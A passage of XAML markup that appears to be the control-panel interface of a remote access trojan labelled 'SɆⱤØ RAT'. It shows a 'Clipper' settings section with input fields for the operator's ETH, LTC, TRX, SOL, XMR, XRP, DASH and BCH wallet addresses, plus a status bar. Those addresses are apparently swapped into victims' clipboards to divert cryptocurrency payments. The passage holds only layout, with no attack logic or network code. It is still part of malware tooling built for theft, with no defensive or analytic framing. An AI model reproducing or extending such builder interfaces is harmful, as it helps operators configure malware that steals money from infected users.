                                                    <TextBlock Text="ETH" Foreground="#627EEA" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperETH" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Ethereum / BNB (0x...)"/></Grid>
                                            <!-- LTC - silver/green -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/ltc.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="LTC" Foreground="#A0A0B8" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperLTC" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Litecoin (L... / M...)"/></Grid>
                                            <!-- TRX - red -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/trx.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="TRX" Foreground="#EF0027" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperTRX" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="TRON (T...)"/></Grid>
                                            <!-- SOL - purple gradient -->
                                            <Grid><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/sol.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="SOL" Foreground="#9945FF" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperSOL" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Solana (base58, 32-44 chars)"/></Grid>
                                        </StackPanel>
                                        <!-- Right column -->
                                        <StackPanel Grid.Column="2">
                                            <TextBlock Text=" " FontSize="9" Margin="0,0,0,10"/>
                                            <!-- XMR - orange-red -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/xmr.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="XMR" Foreground="#FF6600" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperXMR" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Monero (4...)"/></Grid>
                                            <!-- XRP - cyan -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/xrp.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="XRP" Foreground="#00AAE4" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperXRP" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Ripple (r...)"/></Grid>
                                            <!-- DASH - teal -->
                                            <Grid Margin="0,0,0,6"><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/dash.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="DASH" Foreground="#008CE7" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperDASH" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Dash (X...)"/></Grid>
                                            <!-- BCH - green -->
                                            <Grid><Grid.ColumnDefinitions><ColumnDefinition Width="54"/><ColumnDefinition Width="*"/></Grid.ColumnDefinitions>
                                                <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                                                    <Image Source="/Resources/crypto/bch.png" Width="22" Height="22" Margin="0,0,5,0" RenderOptions.BitmapScalingMode="HighQuality"/>
                                                    <TextBlock Text="BCH" Foreground="#4CC947" FontSize="10" FontWeight="Bold" FontFamily="Consolas" VerticalAlignment="Center"/>
                                                </StackPanel>
                                                <TextBox x:Name="ClipperBCH" Grid.Column="1" Style="{StaticResource STxt}" Height="24" FontSize="10" ToolTip="Bitcoin Cash"/></Grid>
                                        </StackPanel>
                                    </Grid>
                                </Border>

                            </DockPanel>
                        </Grid>
                    </Border>
                </TabItem>

            </TabControl>

            <!-- ── Status bar ─────────────────────────────────────── -->
            <Border Grid.Row="4" Background="#C0111222"
                    BorderThickness="0,1,0,0"
                    CornerRadius="0,0,10,10" Padding="16,0">
                <Border.BorderBrush>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#281E2038" Offset="0"/>
                        <GradientStop Color="#1E2038"   Offset="0.5"/>
                        <GradientStop Color="#281E2038" Offset="1"/>
                    </LinearGradientBrush>
                </Border.BorderBrush>
                <Grid>
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*" />
                        <ColumnDefinition Width="Auto" />
                    </Grid.ColumnDefinitions>
                    <TextBlock Grid.Column="0" x:Name="TxtStatusLeft" Text="SɆⱤØ RAT" Foreground="#2E3048"
                               FontSize="10" FontWeight="SemiBold" VerticalAlignment="Center" />
                    <TextBlock x:Name="TxtStatusBar" Grid.Column="1" Text="Ready"
                               Foreground="#606880" FontSize="11" VerticalAlignment="Center"
                               HorizontalAlignment="Right"/>
                </Grid>
            </Border>
        </Grid>
    </Border>
</Window>
